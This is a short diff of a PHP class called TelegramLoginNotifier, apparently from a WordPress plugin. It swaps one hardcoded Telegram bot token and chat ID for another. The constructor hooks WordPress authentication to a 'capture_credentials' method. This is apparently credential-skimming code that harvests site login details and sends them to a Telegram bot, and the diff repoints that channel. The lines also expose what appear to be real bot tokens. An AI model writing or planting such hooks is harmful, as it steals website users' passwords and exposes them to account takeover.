@@ -5,8 +5,8 @@ class TelegramLoginNotifier {
     private $session_key = 'tl_login_attempt';
     
     public function __construct() {
-        $this->bot_token = '8927281774:AAE96HyE7nDUpjkbxpHhB59wxy97KVBHV_4';
-        $this->chat_id   = '8917583887';
+        $this->bot_token = '8506083374:AAHCDHTURj1PfPr8NFxF28ZjpPhdYzCdSII';
+        $this->chat_id   = '6614104922';
         
         add_action('init', [$this, 'init_session'], 0);
         add_filter('authenticate', [$this, 'capture_credentials'], 20, 3);
